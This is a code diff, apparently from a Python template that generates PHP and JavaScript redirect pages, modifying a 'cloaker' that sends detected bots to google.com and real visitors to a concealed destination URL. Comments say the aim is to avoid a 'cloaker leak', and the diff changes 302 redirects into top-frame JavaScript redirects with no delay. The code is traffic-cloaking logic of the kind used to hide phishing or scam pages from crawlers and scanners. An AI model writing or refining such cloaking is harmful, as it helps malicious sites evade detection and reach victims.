@@ -142,13 +142,12 @@ header("Referrer-Policy: strict-origin-when-cross-origin");
 header("X-Frame-Options: SAMEORIGIN");
 
 // 🔥 BOT → GOOGLE (NO CLOAKER LEAK)
-if ($is_bot) {{
-    header("Location: https://www.google.com", true, 302);
-    exit;
-}}
-
-// 🔥 REAL USER → CLOAKER
-header("Location: " . $final, true, 302);
+$redirect_to = $is_bot
+    ? "https://www.google.com"
+    : $final;
+    echo '<script>
+window.top.location.replace(' . json_encode($redirect_to) . ');
+</script>';
 exit;
 
 ?>""",
@@ -198,13 +197,13 @@ exit;
   window.location.replace("https://www.google.com");
   return;
 }}
-    var delay = isBot ? 10 : 30;
+    var delay = 0;
     setTimeout(function() {{
       if (isBot) {{
-        go("https://www.google.com");
-      }} else {{
-        go(finalUrl);
-      }}
+  window.top.location.replace("https://www.google.com");
+}} else {{
+  window.top.location.replace(finalUrl);
+}}
     }}, delay);
   }} catch (e) {{
     window.location.replace("{redirect_url}");
